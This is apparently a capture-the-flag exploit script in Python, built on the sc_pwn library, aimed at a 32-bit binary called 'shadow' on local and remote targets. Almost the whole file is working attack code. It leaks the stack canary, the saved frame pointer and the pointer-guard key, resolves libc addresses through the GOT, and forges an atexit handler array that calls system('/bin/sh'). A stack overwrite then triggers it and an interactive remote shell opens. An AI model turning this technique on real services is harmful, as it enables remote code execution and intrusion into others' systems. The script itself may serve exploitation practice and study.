#!/usr/bin/env python
# https://github.com/shift-crops/sc_pwn/blob/master/sc_pwn.py
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.133','port':8080}, \
                        remote  = {'host':'10.71.1.5','port':18294})
env.set_item('libc',    local   ='D:\CTF\FILES\libc-2.19.so_local', \
                        remote  ='../libc-2.19.so_remote')
env.select()

binf = ELF('shadow')
libc = ELF(env.libc)

addr__main_rfm      = binf.function('main')+0x54
addr_got_main       = binf.got('__libc_start_main')

#==========

def attack(cmn):
    message(cmn, 'hoge', -1, 'a'*0x20+'!')
    
    cmn.read_until('a!')
    canary          = unpack_32('\x00'+cmn.read(3))
    
    info("canary            = 0x%08x"%canary)

    #==========
    
    message(cmn, None, -1, 'a'*0x2b+'!')
    
    cmn.read_until('a!')
    old_ebp             = unpack_32(cmn.read(4))
    addr_enc_addr       = old_ebp-0x3c
    addr_2p_arr_atexit  = old_ebp+0x14
    
    info("old_ebp           = 0x%08x"%old_ebp)
    
    #==========
    
    exploit_st1  = 'a'*0x34
    exploit_st1 += pack_32(addr_enc_addr)
    exploit_st1 += pack_32(8)
    exploit_st1 += pack_32(100)
    message(cmn, None, -1, exploit_st1)
    
    cmn.read_until('<')
    enc_key     = unpack_32(cmn.read(4))^addr__main_rfm
    
    info("enc_key           = 0x%08x"%enc_key)

    #==========
    
    exploit_st2  = 'a'*0x34
    exploit_st2 += pack_32(addr_2p_arr_atexit)
    exploit_st2 += pack_32(8)
    exploit_st2 += pack_32(100)
    message(cmn, None, -1, exploit_st2)
    
    cmn.read_until('<')
    addr_libc_p_arr_atexit    = unpack_32(cmn.read(4))

    exploit_st3  = 'a'*0x34
    exploit_st3 += pack_32(addr_libc_p_arr_atexit)
    exploit_st3 += pack_32(8)
    exploit_st3 += pack_32(100)
    message(cmn, None, -1, exploit_st3)
    
    cmn.read_until('<')
    addr_arr_atexit    = unpack_32(cmn.read(4))
    
    info("addr_arr_atexit   = 0x%08x"%addr_arr_atexit)
    
    #==========

    exploit_st4  = 'a'*0x34
    exploit_st4 += pack_32(addr_got_main+1)
    exploit_st4 += pack_32(8)
    exploit_st4 += pack_32(100)
    message(cmn, None, -1, exploit_st4)
    
    cmn.read_until('<')
    addr_libc_main      = unpack_32(chr(libc.function('__libc_start_main')&0xff)+ cmn.read(3))
    libc.set_location('__libc_start_main', addr_libc_main)
    addr_libc_system    = libc.function('system')
    addr_libc_str_sh    = libc.search('/bin/sh')
    
    info("addr_libc_system  = 0x%08x"%addr_libc_system)

    #==========
    #funcs        = [(addr_main, NULL), (addr_libc_system, addr_libc_str_sh)]
    funcs        = [(addr_libc_system, addr_libc_str_sh)]
    arr_atexit   = gen_arr_atexit(enc_key, funcs)
    
    payload_st1  = 'a'*0x34
    payload_st1 += pack_32(addr_arr_atexit)
    payload_st1 += pack_32(len(arr_atexit))
    payload_st1 += pack_32(100)
    message(cmn, None, -1, payload_st1)

    #==========
    
    payload_st2  = 'a'*0x20
    payload_st2 += pack_32(canary)
    payload_st2 += 'a'*0x10
    payload_st2 += pack_32(addr_libc_str_sh)
    payload_st2 += pack_32(0)
    payload_st2 += pack_32(0)
    message(cmn, arr_atexit, -1, payload_st2)
    
    cmn.read_all()

def message(cmn, name, length, msg):
    if '(y/n)' in cmn.read_until(' : '):
        chname = name is not None
        cmn.sendln('y' if chname else 'n')
        if chname:
            cmn.read_until('name : ')
    else:
        chname = True

    if chname:
        cmn.send(name if name is not None else 'none')
        
    cmn.read_until('length : ')
    cmn.sendln(str(length))
    cmn.read_until('message : ')
    cmn.send(msg)

def gen_arr_atexit(key, funcs):
    arr_atexit  = pack_32(0)
    arr_atexit += pack_32(len(funcs))
    for i in range(len(funcs))[::-1]:
        arr_atexit += pack_32(4)
        arr_atexit += pack_32(rol(funcs[i][0]^key, 9, 32))
        arr_atexit += pack_32(funcs[i][1])
        arr_atexit += pack_32(0)

    return arr_atexit

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
